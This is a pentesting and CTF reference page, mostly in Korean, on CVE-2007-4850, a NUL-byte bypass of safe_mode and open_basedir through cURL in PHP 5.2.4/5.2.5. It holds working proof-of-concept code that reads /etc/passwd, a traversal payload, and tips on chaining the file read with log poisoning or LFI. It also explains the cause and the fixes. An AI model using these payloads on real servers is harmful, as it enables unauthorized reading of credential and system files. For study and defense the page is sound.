# PHP 5.2.4 and 5.2.5 PHP cURL

{{#include ../../../../banners/hacktricks-training.md}}

이 페이지는 특정 PHP 5.2.x 빌드에서 cURL 확장을 사용하여 PHP safe_mode/open_basedir 검사를 우회하는, 레거시이지만 CTFs/local-legacy-installs에서 여전히 유용한 트릭을 문서화합니다.

- Affected: PHP 5.2.4 and 5.2.5 with ext/curl enabled.
- Impact: 무단으로 로컬 파일을 읽을 수 있음(safe_mode 또는 open_basedir 제한을 무시함) (직접적인 코드 실행은 아님).
- ID: CVE-2007-4850.

From http://blog.safebuff.com/2016/05/06/disable-functions-bypass/

## One-liner PoC

If safe_mode or open_basedir are active and cURL is enabled, the following will return the contents of the current script:
```php
var_dump(curl_exec(curl_init("file://safe_mode_bypass\x00".__FILE__)));
```
## 더 명확한 PoC (임의 파일 읽기)
```php
<?php
// Preconditions (legacy): PHP 5.2.4/5.2.5, safe_mode or open_basedir enabled, ext/curl loaded
$target = '/etc/passwd'; // change to the file you want to read
$ch = curl_init();
// The trick is the NUL byte (\x00). Prefix can be any string; checks are confused and the file after the NUL is read.
curl_setopt($ch, CURLOPT_URL, 'file://prefix'.chr(0).$target);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$resp = curl_exec($ch);
$err  = curl_error($ch);
curl_close($ch);
if ($resp !== false) {
echo $resp; // should contain the target file
} else {
echo "cURL error: $err\n";
}
?>
```
참고:
- 실제 NUL 바이트를 주입하려면 큰따옴표 또는 chr(0)를 사용하세요. Percent-encoding (%00)는 신뢰할 수 있게 작동하지 않습니다.
- 이것은 file read primitive입니다. 가능한 경우 다른 primitives(log poisoning, session file inclusion 등)와 결합해 추가 권한 상승에 활용하세요.

## 왜 동작하는가 (요약)

취약점은 PHP 5.2.4/5.2.5가 ext/curl에서 file:// URL에 대해 safe_mode/open_basedir 검사를 수행하던 방식에 있습니다. 검사기는 URL을 파싱하고 경로 구성요소를 검증했지만, NUL-바이트 처리 때문에 실제로 libcurl이 사용한 문자열과 다른 문자열을 검증했습니다. 실제로는 검사기는 NUL 이후의 경로를 승인할 수 있었고 libcurl은 NUL 이전의 부분을 URL 컨테이너로 사용하여, NUL 바이트 이후에 놓인 파일을 읽을 수 있는 우회가 가능했습니다. 자세한 내용은 원본 분석과 curl/interface.c의 영향을 받는 매크로를 참조하세요. [CVE-2007-4850].

## 제약 및 수정

- ext/curl에서 파싱/검증을 수정하여 이후의 5.2.x(예: 배포판 빌드가 5.2.6으로 패치된 경우)에서 수정되었습니다.
- 매우 오래된 PHP 배포에만 영향을 미칩니다; safe_mode는 PHP 5.4에서 제거되었고 현대 빌드에서는 이 동작이 나타나지 않습니다.

## 관련 역사적 cURL 기반 우회

- CVE-2006-2563 (PHP 4.4.2/5.1.4): libcurl 래퍼는 임베디드 NUL로 open_basedir를 우회하여 `file://` 접근을 허용했습니다; 5.2.x 이전에 수정됨.
- PHP bugs #30609/#36223는 canonicalization 없이 `file://`을 사용한 초기 cURL open_basedir 문제를 추적했습니다. NUL 바이트 이전의 어떤 검사이든 또는 `realpath` 스타일의 해상이 없는 검사는 동일한 잘림(truncation)에 취약합니다.

## CTF 팁

- ext/curl이 로드된 PHP 5.2.4/5.2.5를 식별할 때(`phpinfo()`에서 `cURL support => enabled`와 정확한 `PHP Version`을 확인), 이 트릭은 보통 `allow_url_fopen`이 비활성화되어 있어도 작동합니다. ext/curl이 `file://`을 자체적으로 처리하기 때문입니다.
- 직접 경로가 차단될 경우, NUL 이후에 상대 경로 탐색을 시도해보세요. 예: `file://x\x00../../../../etc/passwd`. 탐색은 open_basedir 보호가 아니라 libcurl에 의해 해석됩니다.
- 취약한 서버측 코드가 사용자 제어 URL을 `curl_exec()`로 그대로 반영하는 경우(레거시 SSRF 유사 엔드포인트에서 흔함), 하나의 HTTP 요청 바디에 페이로드를 래핑해 LFI를 유발할 수 있습니다.

## See also

Other disable_functions/open_basedir bypasses and modern techniques are collected here:

{{#ref}}
README.md
{{#endref}}

## References

- [Ubuntu CVE entry with patch pointers and affected versions](https://ubuntu.com/security/CVE-2007-4850)
- [Technical writeup with code context (cxsecurity)](http://cxsecurity.com/issue/WLB-2008010060)
- [PHP bug #36223 (curl bypasses open_basedir)](https://bugs.php.net/bug.php?id=36223)
- [CVE-2006-2563 cURL PHP File Access Bypass (earlier NUL-byte issue)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2563)
{{#include ../../../../banners/hacktricks-training.md}}
